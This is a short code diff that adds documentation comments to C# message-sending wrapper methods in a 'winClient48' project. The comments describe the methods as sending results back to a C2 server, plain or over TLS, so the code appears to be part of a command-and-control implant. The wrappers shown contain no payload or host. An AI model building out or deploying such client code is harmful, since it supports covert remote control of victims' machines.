@@ -180,15 +180,43 @@ namespace winClient48
             }
         }
 
+        /// <summary>
+        /// Send result back to C2 server.
+        /// </summary>
+        /// <param name="szMsg"></param>
         public void fnSendCommand(string szMsg) => fnSendCommand(szMsg.Split('|'));
+        
+        /// <summary>
+        /// Send result back to C2 server.
+        /// </summary>
+        /// <param name="asMsg"></param>
         public void fnSendCommand(string[] asMsg) => fnSendCommand(asMsg.ToList());
+
+        /// <summary>
+        /// Send result back to C2 server.
+        /// </summary>
+        /// <param name="lsMsg"></param>
         public void fnSendCommand(List<string> lsMsg)
         {
             SendCommand(string.Join("|", lsMsg));
         }
 
+        /// <summary>
+        /// Send result back to C2 server via TLS.
+        /// </summary>
+        /// <param name="asMsg"></param>
         public void fnSslSend(string[] asMsg) => fnSslSend(string.Join("|", asMsg));
+        
+        /// <summary>
+        /// Send result back to C2 server via TLS.
+        /// </summary>
+        /// <param name="lsMsg"></param>
         public void fnSslSend(List<string> lsMsg) => fnSslSend(string.Join("|", lsMsg));
+
+        /// <summary>
+        /// Send result back to C2 server via TLS.
+        /// </summary>
+        /// <param name="szMsg"></param>
         public void fnSslSend(string szMsg) => fnSslSendRAW(Encoding.UTF8.GetBytes(szMsg));
 
         /// <summary>
